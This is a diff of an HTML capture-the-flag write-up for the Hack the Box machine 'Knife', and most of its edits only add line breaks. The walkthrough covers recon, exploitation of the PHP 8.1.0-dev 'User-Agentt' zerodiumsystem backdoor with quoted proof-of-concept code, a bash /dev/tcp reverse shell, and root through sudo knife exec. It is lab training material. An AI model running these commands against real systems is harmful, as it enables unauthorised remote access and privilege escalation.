@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-02-05 Sat 19:58 -->
+<!-- 2022-03-23 Wed 21:01 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>HTB | knife</title>
@@ -70,9 +70,9 @@
 <h2 id="orgb5df3cb"><span class="section-number-2">1</span> Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
-Welcome back to another write-up for another Hack the Box machine.
-This time we'll look at the easy linux box Knife.
-This machine was running a webserver with an old PHP version on it, but we'll dive deeper into that later.
+Welcome back to another write-up for another Hack the Box machine.<br>
+This time we'll look at the easy linux box Knife.<br>
+This machine was running a webserver with an old PHP version on it, but we'll dive deeper into that later.<br>
 </p>
 </div>
 </div>
@@ -81,17 +81,17 @@ This machine was running a webserver with an old PHP version on it, but we'll di
 <h2 id="org698bb0a"><span class="section-number-2">2</span> Recon</h2>
 <div class="outline-text-2" id="text-2">
 <p>
-First things first, let's get to know this machine a little better shall we?
-We'll start by examining what services the machine has running.
+First things first, let's get to know this machine a little better shall we?<br>
+We'll start by examining what services the machine has running.<br>
 </p>
 </div>
 <div id="outline-container-org3ca4f67" class="outline-3">
 <h3 id="org3ca4f67"><span class="section-number-3">2.1</span> Nmap all ports</h3>
 <div class="outline-text-3" id="text-2-1">
 <p>
-Below we see the output from the <code>nmap</code> scan.
+Below we see the output from the <code>nmap</code> scan.<br>
 </p>
-<pre class="example" id="orgda2d1c3">
+<pre class="example" id="orgdb1bf4f">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ sudo nmap -sV -sC -p- -oA nmap/all_ports -iL target.txt          19:16
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 19:16 CEST
@@ -113,8 +113,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 39.13 seconds
 </pre>
 <p>
-We see the webserver mentioned earlier running on port 80, which is <code>Apache httpd 2.4.41</code>.
-There is also an open <code>ssh</code> daemon running on port 22.
+We see the webserver mentioned earlier running on port 80, which is <code>Apache httpd 2.4.41</code>.<br>
+There is also an open <code>ssh</code> daemon running on port 22.<br>
 </p>
 </div>
 </div>
@@ -123,16 +123,16 @@ There is also an open <code>ssh</code> daemon running on port 22.
 <h3 id="orgfb10083"><span class="section-number-3">2.2</span> Web enumeration</h3>
 <div class="outline-text-3" id="text-2-2">
 <p>
-All right let us enumerate the webserver
+All right let us enumerate the webserver<br>
 </p>
 </div>
 <div id="outline-container-orgc668221" class="outline-4">
 <h4 id="orgc668221"><span class="section-number-4">2.2.1</span> Gobuster</h4>
 <div class="outline-text-4" id="text-2-2-1">
 <p>
-<code>gobuster</code> didn't really give us anything of use other than <code>/index.php</code>.
+<code>gobuster</code> didn't really give us anything of use other than <code>/index.php</code>.<br>
 </p>
-<pre class="example" id="orgd1bafc1">
+<pre class="example" id="org95ee39e">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ gobuster dir -u "http://10.129.180.32" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -d -b 404,403                                                                                                  19:21
 ===============================================================
@@ -163,19 +163,19 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 <h4 id="orgded9783"><span class="section-number-4">2.2.2</span> <code>/index.php</code></h4>
 <div class="outline-text-4" id="text-2-2-2">
 <p>
-If we open up the site with a browser connected to a proxy like <code>zap</code> or <code>burp</code>, and navigate to <code>/index.php</code>.
+If we open up the site with a browser connected to a proxy like <code>zap</code> or <code>burp</code>, and navigate to <code>/index.php</code>.<br>
 </p>
 
-<figure id="org431d8c4">
-<img src="assets/2021-07-26_19-51-07_screenshot.png" alt="2021-07-26_19-51-07_screenshot.png">
+<figure id="org461114b">
+<img src="assets/2021-07-26_19-51-07_screenshot.png" alt="2021-07-26_19-51-07_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Rendered html of <code>/index.php</code></figcaption>
 </figure>
 
 <p>
-The menu in the top right corner doesn't do anything, so let's take a look at the headers to see if there is anything useful.
+The menu in the top right corner doesn't do anything, so let's take a look at the headers to see if there is anything useful.<br>
 </p>
-<pre class="example" id="org61507f2">
+<pre class="example" id="orgd5491b3">
 HTTP/1.1 200 OK
 Date: Mon, 26 Jul 2021 17:20:52 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -187,8 +187,8 @@ Content-Type: text/html; charset=UTF-8
 </pre>
 
 <p>
-Here we again see the server version as <code>Apache/2.4.41</code>, but more importantly the PHP version is leaked.
-If you look at the <code>X-Powered-By:</code> header, we see that it's is running <code>PHP/8.1.0-dev</code>.
+Here we again see the server version as <code>Apache/2.4.41</code>, but more importantly the PHP version is leaked.<br>
+If you look at the <code>X-Powered-By:</code> header, we see that it's is running <code>PHP/8.1.0-dev</code>.<br>
 </p>
 </div>
 </div>
@@ -203,19 +203,19 @@ If you look at the <code>X-Powered-By:</code> header, we see that it's is runnin
 <h3 id="org805c013"><span class="section-number-3">3.1</span> Finding the vulnerability</h3>
 <div class="outline-text-3" id="text-3-1">
 <p>
-Now that we're done gathering all information possible about the target, mainly the version numbers of the softare running on the server.
+Now that we're done gathering all information possible about the target, mainly the version numbers of the softare running on the server.<br>
 </p>
 
 <p>
-Googling the PHP version, you'll quickly find that there is a backdoor in that version<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>.
-Which could be used to gain a shell.
-They even gave a script that gives a reverse shell on the target.
-<a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce">GitHub Repo</a>
+Googling the PHP version, you'll quickly find that there is a backdoor in that version<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>.<br>
+Which could be used to gain a shell.<br>
+They even gave a script that gives a reverse shell on the target.<br>
+<a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce">GitHub Repo</a><br>
 </p>
 
 <p>
-We can take a closer look at the POC to getter a better understand the backdoor.
-The backdoor allowed for remote code execution in the custom header "User-Agentt", notice the extra "t".
+We can take a closer look at the POC to getter a better understand the backdoor.<br>
+The backdoor allowed for remote code execution in the custom header "User-Agentt", notice the extra "t".<br>
 </p>
 <div class="org-src-container">
 <label class="org-src-name"><span class="listing-number">Listing 1: </span>reverse shell POC code</label><pre class="src src-python">def reverse_shell(args):
@@ -234,8 +234,8 @@ The backdoor allowed for remote code execution in the custom header "User-Agentt
 </pre>
 </div>
 <p>
-First the payload is crafted based on the given arguments.
-It essentially builds the command:
+First the payload is crafted based on the given arguments.<br>
+It essentially builds the command:<br>
 </p>
 <pre class="example">
 $ bash -c "bash -i &gt;&amp; /dev/tcp/&lt;LOCAL-IP&gt;/&lt;LOCAL-PORT&gt; 0&gt;&amp;1"
@@ -243,7 +243,7 @@ $ bash -c "bash -i &gt;&amp; /dev/tcp/&lt;LOCAL-IP&gt;/&lt;LOCAL-PORT&gt; 0&gt;&
 
 
 <p>
-Which is then injected into the special header "User-Agentt", inside the parentheses of <code>"zerodiumsystem();"</code>.
+Which is then injected into the special header "User-Agentt", inside the parentheses of <code>"zerodiumsystem();"</code>.<br>
 </p>
 </div>
 </div>
@@ -251,7 +251,7 @@ Which is then injected into the special header "User-Agentt", inside the parenth
 <h3 id="org5772ba3"><span class="section-number-3">3.2</span> Popping shell</h3>
 <div class="outline-text-3" id="text-3-2">
 <p>
-First we setup a <code>netcat</code> listener on our machine:
+First we setup a <code>netcat</code> listener on our machine:<br>
 </p>
 <pre class="example">
 $ nc -nlvp 4444
@@ -259,17 +259,17 @@ $ nc -nlvp 4444
 
 
 <p>
-Then we execute the revshell POC script with the right arguments:
+Then we execute the revshell POC script with the right arguments:<br>
 </p>
-<pre class="example" id="orgca390d7">
+<pre class="example" id="org67d3120">
 ┌──[c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife/php-8.1.0-dev-backdoor-rce ]
 └─&gt; $ python revshell_php_8.1.0-dev.py "http://10.129.180.32" 10.10.14.87 4444                                   20:02
 </pre>
 
 <p>
-And just like that we got a shell and user flag:
+And just like that we got a shell and user flag:<br>
 </p>
-<pre class="example" id="org9e4d7f0">
+<pre class="example" id="org98d0b7d">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ nc -nlvp 4444                                                    19:56
 james@knife:/$ whoami
@@ -298,17 +298,17 @@ james@knife:~$
 <h2 id="orgde74795"><span class="section-number-2">4</span> Priv-esc</h2>
 <div class="outline-text-2" id="text-4">
 <p>
-Now that we got a shell, we must escalate our privileges to get <code>root</code>.
+Now that we got a shell, we must escalate our privileges to get <code>root</code>.<br>
 </p>
 
 <p>
-By using the linux enumeration tool <code>linpeas</code>, we will find that <code>james</code>, our user, has nopassword permissions for the binary <code>/usr/bin/knife</code>.
+By using the linux enumeration tool <code>linpeas</code>, we will find that <code>james</code>, our user, has nopassword permissions for the binary <code>/usr/bin/knife</code>.<br>
 </p>
 
 <p>
-Which given the machines name, could be worth looking into.
-Let's open <a href="https://gtfobins.github.io/">GTFObins</a>, and search for knife.
-This shows the that following command can be used to escalate our privileges:
+Which given the machines name, could be worth looking into.<br>
+Let's open <a href="https://gtfobins.github.io/">GTFObins</a>, and search for knife.<br>
+This shows the that following command can be used to escalate our privileges:<br>
 </p>
 <pre class="example">
 $ sudo knife exec -E 'exec "/bin/sh"'
@@ -316,9 +316,9 @@ $ sudo knife exec -E 'exec "/bin/sh"'
 
 
 <p>
-So let's run it and get our <code>root</code> flag:
+So let's run it and get our <code>root</code> flag:<br>
 </p>
-<pre class="example" id="org8b1af1c">
+<pre class="example" id="org74313fe">
 james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
 sudo knife exec -E 'exec "/bin/bash"'
 
@@ -341,7 +341,7 @@ cat root.txt
 <div id="text-footnotes">
 
 <div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1">1</a></sup> <div class="footpara"><p class="footpara">
-Read more here: <a href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/">https://flast101.github.io/php-8.1.0-dev-backdoor-rce/</a> 
+Read more here: <a href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/">https://flast101.github.io/php-8.1.0-dev-backdoor-rce/</a> <br>
 </p></div></div>
 
 
